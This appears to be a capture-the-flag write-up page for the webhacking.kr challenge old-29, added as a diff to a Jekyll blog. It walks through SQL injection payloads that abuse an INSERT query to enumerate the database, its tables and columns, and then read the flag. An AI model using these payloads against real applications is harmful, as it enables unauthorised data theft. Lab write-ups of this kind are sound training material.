@@ -1,0 +1,104 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Webhacking old-29 Solution | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Webhacking old-29 Solution" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/webhacking.kr/old-29.html" />
+<meta property="og:url" content="http://localhost:4000/webhacking.kr/old-29.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Webhacking old-29 Solution" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"Webhacking old-29 Solution","url":"http://localhost:4000/webhacking.kr/old-29.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=885199f883f5b847967c84d0262eab1578eb3466">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+  </head>
+  <body>
+      <div id="header">
+        <nav>
+          <ul>
+            <li class="fork"><a href="https://github.com/avishaigonen123/CTF_writeups">View On GitHub</a></li>
+            
+          </ul>
+        </nav>
+      </div><!-- end header -->
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Avishai's CTF Writeups</h1>
+          <p>...</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/avishaigonen123">avishaigonen123</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="webhacking-old-29-solution">Webhacking old-29 Solution</h1>
+
+<p>this is another sql injection challenge.
+I think the sql query is like that: <code class="language-plaintext highlighter-rouge">INSERT INTO table Values (filename)</code>, so, we need to see what are the next columns, there are 2 options:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(filename, ip, time)
+(filename, time, ip)
+</code></pre></div></div>
+
+<p>my-ip = <code class="language-plaintext highlighter-rouge">149.102.239.232</code>
+let’s try each of this methods, and see which one works.</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">file', '149.102.239.232', 0)# </code></li>
+  <li><code class="language-plaintext highlighter-rouge">file', 0, '149.102.239.232')# </code></li>
+</ol>
+
+<p>the second method works!</p>
+
+<p><img src="/webhacking.kr/images/old-29_1.png" alt="alt text" /></p>
+
+<p>now, let’s insert this payload, in order to find the database:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file', 0, '149.102.239.232'), ((select database()), 0, '149.102.239.232')# 
+</code></pre></div></div>
+<p>database: <code class="language-plaintext highlighter-rouge">chall29</code></p>
+
+<p>retrieve tables:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file', 0, '149.102.239.232'), ((select group_concat(table_name) from information_schema.tables where table_schema='chall29'), 0, '149.102.239.232')# 
+</code></pre></div></div>
+<p>tables: <code class="language-plaintext highlighter-rouge">files,flag_congratz</code></p>
+
+<p>retrieve columns:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file', 0, '149.102.239.232'), ((select group_concat(column_name) from information_schema.columns where table_name='flag_congratz'), 0, '149.102.239.232')# 
+</code></pre></div></div>
+<p>columns: <code class="language-plaintext highlighter-rouge">flag</code></p>
+
+<p>now, only need to achieve the flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file', 0, '149.102.239.232'), ((select flag from flag_congratz), 0, '149.102.239.232')# 
+</code></pre></div></div>
+<p>flag: <code class="language-plaintext highlighter-rouge">FLAG{didYouFeelConfused?_sorry:)}</code></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">FLAG{didYouFeelConfused?_sorry:)}</code></em></strong></p>
+
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
